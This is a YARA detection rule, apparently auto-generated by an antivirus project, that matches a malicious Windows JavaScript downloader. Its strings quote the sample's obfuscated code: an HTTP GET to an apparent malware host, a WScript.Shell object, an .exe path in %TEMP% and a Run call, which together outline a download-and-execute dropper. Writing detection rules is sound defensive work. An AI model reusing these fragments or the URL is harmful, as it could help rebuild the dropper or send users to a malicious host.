rule sig_20160330_c096118ef3d0daa82f173edd6009f89a {
  meta:
    description = "datamaliciousorder - file 20160330_c096118ef3d0daa82f173edd6009f89a.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "4cb79e55c2e9f81cf2f8bf468c9822fbd074a86aa389d46e539d4fc14ef7de76"

  strings:
    $s1  = "_A0[_HO](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "var _ZO = function _Z() {return WScript[_GA](\"WScript\"+\".Shell\");}(), _AT = 11;" fullword ascii
    $s3  = "function _R0(_CR, _R1){_BX = _BX * 1; return _CR - _R1;};" fullword ascii
    $s4  = "if (_A0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _UW() {return _ZO[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"nleWCWeo.ex\" + \"e\";};" fullword ascii
    $s6  = "function _Z0(){return _DA + \"\";};" fullword ascii
    $s7  = "function _U(_Y1){_ZO[\"Run\"](_Y1, _BX, _BX);};" fullword ascii
    $s8  = "function _R() {return ((_T == true) && (_T == _V)) ? 1 : _BX;};" fullword ascii
    $s9  = "function _Y(){return 22;};" fullword ascii
    $s10 = "function _P()" fullword ascii
    $s11 = "var _X = new this[\"Date\"]();" fullword ascii
    $s12 = "function _Q(){return _GA;};" fullword ascii
    $s13 = " while (_Q0){" fullword ascii
    $s14 = "function _EF(_XP) {var _PJ = (1, 2, 3, 4, 5, _XP); return _PJ;};" fullword ascii
    $s15 = "return _R0(_OH, _B);" fullword ascii
    $s16 = "var _V = false;" fullword ascii
    $s17 = "_V = true; " fullword ascii
    $s18 = "var _S0 = false;" fullword ascii
    $s19 = "var _T = false;" fullword ascii
    $s20 = "_T = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}